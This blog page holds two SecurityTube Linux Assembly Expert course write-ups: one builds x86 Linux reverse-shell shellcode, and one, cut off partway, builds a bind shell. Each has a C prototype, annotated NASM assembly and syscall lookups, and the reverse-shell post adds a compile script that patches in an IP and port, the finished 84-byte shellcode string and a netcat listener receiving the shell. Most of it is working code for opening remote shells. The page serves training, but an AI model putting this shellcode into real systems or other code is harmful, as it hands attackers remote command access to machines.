      <span class="entry-date date published updated"><time datetime="2017-03-28T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-2/">March 28, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~5 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-2/" rel="bookmark" title="SLAE Assignment 2" itemprop="url">SLAE Assignment 2</a></h1>
    
  </header>
  <div class="entry-content">
    <h2 id="requirements">Requirements</h2>

<ul>
  <li>Create a reverse shell shellcode
    <ul>
      <li>Connects to a IP and port</li>
      <li>Execs Shell when connected</li>
    </ul>
  </li>
  <li>IP and Port number should be easily conﬁgurable</li>
</ul>

<p>To better understand the task ahead and which components that are needed, I wrote a small program in C.</p>

<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
</span>
<span class="cp">#define REMOTEPORT 1337
#define REMOTEIP "127.0.0.1"
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="c1">// Address information for server and client
</span>	<span class="c1">// sockaddr_in is found in 'netinet/in.h'
</span>	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">client_addr</span><span class="p">;</span> 
	
	<span class="c1">// Set up the values for the connecting socket	
</span>	<span class="n">client_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>			
	<span class="n">client_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">REMOTEPORT</span><span class="p">);</span>
	<span class="n">client_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">REMOTEIP</span><span class="p">);</span> 
	
	<span class="c1">// Create a TCP socket, stream and protocol IP.
</span>	<span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>	

	<span class="c1">// Connect to 'client'
</span>	<span class="kt">int</span> <span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_addr</span><span class="p">);</span>	
	<span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="n">sin_size</span><span class="p">);</span>
	
	<span class="c1">// Duplicate the socket to stdin, stdout, stderr
</span>	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
		<span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="c1">// And run the shell
</span>	<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>	
<span class="p">}</span>

</code></pre>
</div>
<p>So the steps needed are:</p>

<ol>
  <li>Create a socket</li>
  <li>Connect to a IP and port</li>
  <li>Copy socket desdriptor to stdio, stdout, stderr</li>
  <li>Execute execve</li>
</ol>

<p>So the first function to invoke is the connect()-function.</p>

<p>As in the previous assignment, all the socket handling is done by the syscall “socketcall”, which has syscall number 102 (or 0x66).</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
<span class="c">#define __NR_socketcall 102</span>
<span class="c">#define __NR_socket 359</span>
<span class="c">#define __NR_socketpair 360</span>
</code></pre>
</div>

<p>We find the function numbers in the “net” header file:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/linux/net.h | grep <span class="s1">'sys_socket(2)'</span> -A5
<span class="c">#define SYS_SOCKET  1       /* sys_socket(2)        */</span>
<span class="c">#define SYS_BIND    2       /* sys_bind(2)          */</span>
<span class="c">#define SYS_CONNECT 3       /* sys_connect(2)       */</span>
<span class="c">#define SYS_LISTEN  4       /* sys_listen(2)        */</span>
<span class="c">#define SYS_ACCEPT  5       /* sys_accept(2)        */</span>

</code></pre>
</div>

<h3 id="socket">Socket</h3>
<p>So the first task is to create the socket needed. 
We set up the registers and execute the syscall to get a socket descriptor returned in eax. We need to save this for later use.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; SOCKET    </span>
    <span class="k">push</span> <span class="mh">0x66</span>       <span class="c">; Syscall for socketcall</span>
    <span class="k">pop</span> <span class="n">eax</span>         <span class="c">; put syscall number in eax</span>

    <span class="k">push</span> <span class="mh">0x1</span>        <span class="c">; Socketcall-number for "socket"</span>
    <span class="k">pop</span> <span class="n">ebx</span>         <span class="c">; Put in ebx</span>
        
    <span class="c">; Set up the args for socket</span>
    <span class="c">; cat /usr/include/linux/in.h </span>
    <span class="c">; PUSH protocol, type and domain</span>
    <span class="c">; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2</span>
    <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>    <span class="c">; Make edi null</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; This is 'Protocol' TCP = 0</span>
    <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; ebx already has 1 in it, reuse for Type</span>
    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x02</span><span class="c">; Inet = 2.</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put 'pointer' to args in ecx (args to socketcall)</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; execute syscall. </span>

    <span class="c">; Now we have a socketfd in eax</span>
    <span class="k">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>   <span class="c">; Save socketfd in esi (as we need it later on)</span>

</code></pre>
</div>

<h3 id="connect">Connect</h3>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; CONNECT</span>
    <span class="c">; Set up args for 'Connect'</span>
    <span class="c">;   connect(int sockfd, const struct sockaddr *addr, int addrlen);</span>
    
    <span class="c">; ebx = socketfd (esi)</span>
    <span class="c">; ecx = args for bind (struct sockaddr) </span>
    <span class="c">; edx length of the args</span>
    
    <span class="c">; Setup the sockaddr, push the values to the stack</span>
    <span class="c">; sockaddr (2, 9999, 0)</span>
    <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
        <span class="k">push</span> <span class="mh">0x0101017f</span> <span class="c">; 127.0.0.1</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x3905</span><span class="c">; Port 9999 in hex network byte order (0x0f27)</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call  </span>
    
    <span class="k">push</span> <span class="mh">0x10</span>       <span class="c">; Size of the sockaddr struct (16 bytes)</span>
    <span class="k">push</span> <span class="n">ecx</span>        <span class="c">; Argv for bind</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Bind'-args in ecx</span>
    
    <span class="k">add</span> <span class="n">bl</span><span class="p">,</span> <span class="mi">2</span>          <span class="c">; inc ebx to 3, for 'Coonect'-socketcall number</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; zero out eax </span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>

</code></pre>
</div>

<h3 id="dup2">dup2</h3>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; to dup2 i/o-to client socketfd</span>
    <span class="c">; dup2(oldfd, newfd)</span>

    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esi</span>    <span class="c">; put client socketfd (returned in eax) to ebx</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; make eax zero</span>

    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Zero out ecx</span>
    <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x03</span>    <span class="c">; Start value for counter</span>
<span class="n">dup2</span><span class="o">:</span>
    <span class="k">dec</span> <span class="n">ecx</span>         <span class="c">; decrese ecx</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>    <span class="c">; syscall for dup2</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
    <span class="k">jnz</span> <span class="n">dup2</span>        <span class="c">; If ecx i not zero, next iteration</span>

</code></pre>
</div>

<h3 id="execve">execve</h3>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>
<span class="c">; EXECVE</span>
    <span class="c">; Setup execve</span>
    <span class="c">; execve ("/bin/sh", NULL, NULL)</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Zero eax</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0 used as a terminator</span>
    <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">; hs/n in hex</span>
    <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">; ib//  in hex</span>

    <span class="c">; Set up ebx for syscall     </span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put address to //bin/sh0x0 in ebx     </span>
    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Put a zero in ecx     </span>
    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; Put a zero in edx     </span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>     <span class="c">; Syscall for execve     </span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall </span>
</code></pre>
</div>

<h2 id="replace-ip-address">Replace IP address</h2>

<p>Since one requirement is to be able to configure the IP address, I updated the compiler-script to replace the IP at compile time:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="nv">ipmarker</span><span class="o">=</span><span class="s2">"</span><span class="se">\\\x</span><span class="s2">bb</span><span class="se">\\\x</span><span class="s2">bb</span><span class="se">\\\x</span><span class="s2">bb</span><span class="se">\\\x</span><span class="s2">bb"</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$shellcode</span> <span class="o">==</span> <span class="k">*</span><span class="nv">$ipmarker</span><span class="k">*</span> <span class="o">]]</span> ; <span class="k">then</span>
        <span class="c"># Yes, shellcode contains ip marker bytes       </span>

        <span class="nv">ipbytes</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$ip</span> | tr <span class="s2">"."</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="k">)</span>

        <span class="nv">iphexbytes</span><span class="o">=</span><span class="s2">""</span>
        <span class="k">for </span>byte <span class="k">in</span> <span class="nv">$ipbytes</span>
        <span class="k">do
                </span><span class="nv">iphexbyte</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span> <span class="s2">"%02x"</span> <span class="nv">$byte</span><span class="k">)</span>
                <span class="nv">iphexbytes</span><span class="o">=</span><span class="nv">$iphexbytes</span><span class="s2">"</span><span class="se">\\</span><span class="s2">x</span><span class="nv">$iphexbyte</span><span class="s2">"</span>
        <span class="k">done

        </span><span class="nb">echo</span> <span class="s2">"[***] Replacing the ip to </span><span class="nv">$ip</span><span class="s2"> (</span><span class="nv">$iphexbytes</span><span class="s2">)"</span>
        <span class="nv">shellcode</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">shellcode</span><span class="p">/</span><span class="nv">$ipmarker</span><span class="p">/</span><span class="nv">$iphexbytes</span><span class="k">}</span><span class="s2">"</span>
<span class="k">fi</span>
</code></pre>
</div>
<p>Of course, we need to change the IP and port assignment in the source code (done under ‘connect’):</p>
<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>  <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
        <span class="k">push</span> <span class="mh">0xbbbbbbbb</span> <span class="c">; Marker bytes for replaceing the IP</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0xaaaa</span><span class="c">; Marker bytes for replaceing the port</span>
        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call </span>
</code></pre>
</div>

<p>Execute the script, providing the IP and port (first we get our IP):</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ ifconfig eth0 | grep eth0 -A2
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.56.101 netmask 255.255.255.0  broadcast 10.0.2.255
      
rtmcx@parrot $ compile.sh 192.168.56.101 4455
[***] Compiling with nasm...
[***] Linking with ld...

[***] Replacing the ip to 192.168.56.101 (\xc0\xa8\x38\x65)
[***] Replacing the port to 4455 (\x11\x67)

[***] Extracted shellcode:
\x6a\x66\x58\x6a\x01\x5b\x31\xff\x57\x53\x6a\x02\x89\xe1\xcd\x80\x96\x68\xc0\xa8\x38\x65\x66\x68\x11\x67\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\x80\xc3\x02\x31\xc0\xb0\x66\xcd\x80\x89\xf3\x31\xc0\x31\xc9\xb1\x03\x49\xb0\x3f\xcd\x80\x75\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
Shellcode length: 84
</code></pre>
</div>
<p>We can now setup a netcat listener and execute out shellcode to get it to connect ‘back to us’.</p>

<p>Start the listener:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ nc -lvp 4455
listening on [any] 4455 ...
</code></pre>
</div>

<p>Execute the shellcode-wrapper (in another terminal):</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ ./shellcode-reverse-shell 
Shellcode length: 84
</code></pre>
</div>

<p>We get the connection in the listener terminal…</p>
<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ nc -lvp 4455
listening on [any] 4455 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.101] 57786

ls
reverse-shell
reverse-shell.nasm
reverse-shell.o
shellcode-reverse-shell
shellcode-reverse-shell.c
</code></pre>
</div>
<p>Assignment done!</p>

<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>

<hr />

<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>

<p>Student ID: PA-0726</p>

  </div><!-- /.entry-content -->
</article><!-- /.hentry -->

<article class="hentry">
  <header>
    
      <div class="entry-image-index">
        <a href="https://rtmcx.github.io/SLAE-Assignment-1/" title="SLAE Assignment 1"><img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 1"></a>
      </div><!-- /.entry-image -->
    
    <div class="entry-meta">
      <span class="entry-date date published updated"><time datetime="2017-03-23T00:00:00+00:00"><a href="https://rtmcx.github.io/SLAE-Assignment-1/">March 23, 2017</a></time></span><span class="author vcard"><span class="fn"><a href="https://rtmcx.github.io/about/" title="About rtmcx">rtmcx</a></span></span>
      
      <span class="entry-reading-time">
        <i class="fa fa-clock-o"></i>
        
Reading time ~11 minutes
      </span><!-- /.entry-reading-time -->
      
    </div><!-- /.entry-meta -->
    
      <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-1/" rel="bookmark" title="SLAE Assignment 1" itemprop="url">SLAE Assignment 1</a></h1>
    
  </header>
  <div class="entry-content">
    <h1 id="bind-shell">Bind shell</h1>

<h2 id="requirements">Requirements</h2>

<ul>
  <li>Create a Shell_Bind_TCP  shellcode
    <ul>
      <li>Binds to a port</li>
      <li>Execs Shell on incoming connection</li>
    </ul>
  </li>
  <li>Port number should be easily conﬁgurable</li>
</ul>

<p>To better understand the task ahead and which components that are needed, I wrote a small program in C.</p>

<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
</span>
<span class="cp">#define SRVPORT 5555
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="c1">// Address information for server and client
</span>        <span class="c1">// sockaddr_in is found in 'netinet/in.h'
</span>        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">host_addr</span><span class="p">,</span> <span class="n">client_addr</span><span class="p">;</span>

        <span class="c1">// Create a TCP socket, of type stream and protocol IP.
</span>        <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span> <span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>

        <span class="c1">// Set up the values for the 'Bind'-function   
</span>        <span class="n">host_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>                          
        <span class="n">host_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">SRVPORT</span><span class="p">);</span>                    <span class="c1">// Portnum 
</span>        <span class="n">host_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span>  <span class="n">htonl</span> <span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>        <span class="c1">// Bind to any IP
</span>
        <span class="c1">// Bind the socket to the host
</span>        <span class="n">bind</span> <span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">host_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">));</span>

        <span class="c1">// Start to listen on the socket..
</span>        <span class="n">listen</span> <span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

        <span class="c1">// Accept incomming request
</span>        <span class="n">socklen_t</span> <span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">clientfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sin_size</span><span class="p">);</span>

        <span class="c1">// Duplicate the socket to stdin, stdout, stderr
</span>        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
                <span class="n">dup2</span><span class="p">(</span><span class="n">clientfd</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">// And run the shell
</span>        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
</div>
<p>Inspiration taken from “Hacking: The Art of Exploitation” by Jon Erickson and alse from http://www.umiacs.com/</p>

<p>Ok, so we have a “template” program to start mapping and converting to asm.
The tasks we need to perfom are:</p>

<ol>
  <li>Create a socket</li>
  <li>Bind</li>
  <li>Listen</li>
  <li>Accept connection</li>
  <li>Copy fd to stdio, stdout, stderr</li>
  <li>Execve</li>
</ol>

<p>So the first function to invoke is the socket()-function.</p>

<p>We start by looking up the syscall responsible for the socket creation. 
It turns out that all the socket handling is done by the syscall “socketcall”, which has syscall number 102 (or 0x66).</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
<span class="c">#define __NR_socketcall 102</span>
<span class="c">#define __NR_socket 359</span>
<span class="c">#define __NR_socketpair 360</span>
</code></pre>
</div>

<p>“man socketcall” give the following function declaration:</p>

<p>; int socketcall(int call, unsigned long *args);</p>

<p>So, to execute a socket-funktion, we need to set up the syscall and pass which socket-function to execute, and a array with the arguments to that function.</p>

<p>We find the function numbers in the “net” header file:</p>

<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/linux/net.h | grep <span class="s1">'sys_socket(2)'</span> -A5
<span class="c">#define SYS_SOCKET  1       /* sys_socket(2)        */</span>
<span class="c">#define SYS_BIND    2       /* sys_bind(2)          */</span>
<span class="c">#define SYS_CONNECT 3       /* sys_connect(2)       */</span>
<span class="c">#define SYS_LISTEN  4       /* sys_listen(2)        */</span>
<span class="c">#define SYS_ACCEPT  5       /* sys_accept(2)        */</span>

</code></pre>
</div>

<h2 id="socket">Socket</h2>
<p>So to successfully execute a socket-function call we must set up the registers as the following example:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x66</span>   <span class="c">; Syscall number for socketcall</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="mh">0x1</span>    <span class="c">; The socket function to execute (1 = socket) </span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; The address to an array of arguments to the function</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Make the syscall</span>
</code></pre>
</div>

<p>We use the stack for setting up the arguments for the function. 
We push the values to the stack, in reverse order, and moves the esp pointer to ecx and then make the syscall.</p>

<p>Like so:</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; Create a socket using socketcall</span>
    <span class="c">; sockfd = socket(int socket_family, int socket_type, int protocol);</span>
    <span class="c">; PUSH protocol, type and domain</span>
    <span class="c">; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2</span>
    <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>    <span class="c">; Make edi null</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; Protocol', TCP = 0</span>
    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x01</span>  <span class="c">; 'Type', SOCK_STREAM = 1</span>
    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x02</span>  <span class="c">; 'Domain', INET = 2.</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx (this is the args to socketcall)</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Make the syscall </span>
    <span class="k">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>   <span class="c">; Save socketfd in esi (as we need it later on)</span>
</code></pre>
</div>
<p>ecx now contains the args-array needed for ‘Socket’-to be called successfully.</p>

<p>After the syscall has executed, the socket descriptor is then returned in eax, we save that to ‘esi’ so that we can reference it later.</p>

<h2 id="bind">Bind</h2>
<p>Next call needed is the ‘Bind’-call.</p>

<p>All code is commented and it should be fairly easy to understand what the code does and what steps that are necessary.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>   <span class="c">; BIND</span>
    <span class="c">; Set up args for 'Bind'</span>
    <span class="c">;   int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</span>
    
    <span class="c">; ebx = socketfd (esi)</span>
    <span class="c">; ecx = args for bind (struct sockaddr) </span>
    <span class="c">; edx length of the args</span>
    
    <span class="c">; Setup the sockaddr, push the values to the stack</span>
    <span class="c">; sockaddr (2, 9999, 0)</span>
    <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0    (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x0f27</span><span class="c">; Port 9999 in hex network byte order ()</span>
    <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call  </span>
    
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; inc ebx to 2, for 'Bind'-socketcall number</span>
    <span class="k">push</span> <span class="mh">0x10</span>       <span class="c">; Size of the sockaddr struct (16 bytes)</span>
    <span class="k">push</span> <span class="n">ecx</span>        <span class="c">; Argv for bind</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Bind'-args in ecx</span>
    
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; zero out eax </span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
</code></pre>
</div>

<h2 id="listen">Listen</h2>
<p>Next call needed is the ‘Listen’-call.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; LISTEN</span>
    <span class="c">; Setup args for 'Listen' </span>
    <span class="c">; listen(socketfd, backlog)</span>

    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Make eax null</span>
    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0</span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>
    
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Listen'-args</span>
    <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x4</span>     <span class="c">; Syscall for listen</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>


</code></pre>
</div>

<h2 id="accept">Accept</h2>
<p>Next call needed is the ‘Accept’-call.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>    <span class="c">; ACCEPT</span>
    <span class="c">; Setup args for 'Accept'</span>
    <span class="c">; accept( socketfd, struct sockaddr, sizeof sockaddr)</span>
    <span class="c">; Since we know nothing of the client, sockaddr and it's size is set to 0   </span>
    
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; edi is still 0 (ADDR_FAMILY ALL)</span>
    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; </span>
    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it </span>

    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; struct for sockaddr (client)</span>
    <span class="k">inc</span> <span class="n">bl</span>          <span class="c">; ebx has 4 since 'listen' call. Inc to make 5 for accept</span>
    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>

</code></pre>
</div>
<h2 id="dup2">dup2</h2>
<p>Next we need to perform the “dup2”-syscall to redirect the incoming traffic to stdin, stdout and stderr.</p>

<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; DUP2</span>
    <span class="c">; Now we need to dup2 i/o-to client socketfd</span>
    <span class="c">; dup2(oldfd, newfd)</span>
    
